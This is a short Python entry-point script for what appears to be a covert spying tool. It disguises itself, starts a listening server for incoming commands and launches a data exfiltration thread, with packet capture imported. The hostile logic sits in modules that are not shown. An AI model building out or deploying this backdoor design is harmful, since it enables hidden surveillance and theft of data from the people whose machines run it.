import socket
from struct import *
import pcapy
import sys
import psutil
import time
import threading
import signal
import config
import spyFunctions
import recvFunctions
import exfil
# import sendFunctions
# import utils

running = True

def main(argv):
	spyFunctions.disguise()
	recvFunctions.startServer()
	exfil.startThread()

	try:
		while(True):
			time.sleep(1)
	except (KeyboardInterrupt, SystemExit):
		sys.exit()

if __name__ == "__main__":
	main(sys.argv)